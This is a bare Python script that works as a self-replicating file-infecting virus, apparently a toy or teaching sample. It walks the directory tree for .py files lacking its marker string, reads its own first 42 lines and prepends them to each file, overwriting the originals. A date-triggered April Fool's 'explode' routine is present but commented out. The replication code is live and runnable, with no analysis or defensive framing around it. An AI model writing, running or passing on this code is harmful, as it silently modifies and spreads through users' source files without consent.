import os, datetime, inspect

DATA_TO_INSERT = "A VIRUS JUST INFECTED YOUR FILE"
def search(path):
    filesToInfect = []
    files = os.listdir(path)
    for file in files:
        if os.path.isdir(file):
            filesToInfect.extend( search(os.path.join(path + "/" + file)) )
        elif file[-3:] == '.py':
            isInfected = False
            for line in open(path + "/" + file):
                if DATA_TO_INSERT in line:
                    isInfected = True
                    break
            if isInfected == False:
                filesToInfect.append(file)
    return filesToInfect

def infect(filesToInfect):
    target_file = inspect.currentframe().f_code.co_filename
    virus = open(os.path.abspath(target_file))
    virus_string = ""
    for i, line in enumerate(virus):
        if i>=0 and i<=41:
            virus_string += line
    virus.close
    for file_name in filesToInfect:
        file = open(file_name)
        temp = file.read()
        file.close()
        file = open(file_name, "w")
        file.write(virus_string + temp)
        file.close()

def explode():
    if datetime.datetime.now().month == 4 and \
        datetime.datetime.now().day == 1:
        print("HAPPY APRIL FOOL'S DAY!!")

filesToInfect = search(os.path.abspath(""))
infect(filesToInfect)
# explode()
# print(os.path.abspath(""))